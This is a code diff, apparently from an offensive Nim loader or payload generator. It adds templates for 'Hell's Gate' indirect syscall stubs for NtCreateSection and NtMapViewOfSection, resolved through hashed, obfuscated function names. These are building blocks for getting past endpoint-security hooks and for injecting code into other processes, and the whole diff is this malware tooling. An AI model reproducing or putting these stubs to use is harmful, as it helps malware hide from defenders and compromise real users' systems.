@@ -82,6 +82,41 @@ var
 
 """
 
+let HellsgateNtCreateSectionDelegate*  = """
+
+proc NtCreateSection(SectionHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, MaximumSize: PLARGE_INTEGER, SectionPageProtection: ULONG, AllocationAttributes: ULONG, FileHandle: HANDLE): NTSTATUS {.asmNoStackFrame.} =
+    asm ===
+        mov r10, rcx
+        mov eax, `syscall`
+        mov r11, `syscallJumpAddress`
+        jmp r11
+        ret
+    ===
+
+var
+    ntCreateSectionfuncHash        : uint64            = djb2_hash(obf("NtCreateSection"))
+    ntCreateSectionTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntCreateSectionfuncHash)
+
+"""
+
+let HellsgateNtMapViewOfSectionDelegate*  = """
+
+proc NtMapViewOfSection(SectionHandle: HANDLE, ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, CommitSize: SIZE_T, SectionOffset: PLARGE_INTEGER, ViewSize: PSIZE_T, InheritDisposition: ULONG, AllocationType: ULONG, Win32Protect: ULONG): NTSTATUS {.asmNoStackFrame.} =
+    asm ===
+        mov r10, rcx
+        mov eax, `syscall`
+        mov r11, `syscallJumpAddress`
+        jmp r11
+        ret
+    ===
+
+var
+    ntMapViewOfSectionfuncHash        : uint64            = djb2_hash(obf("NtMapViewOfSection"))
+    ntMapViewOfSectionTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntMapViewOfSectionfuncHash)
+
+"""
+
+
 let HellsgateNtCreateThreadExDelegate*  = """
 
 type
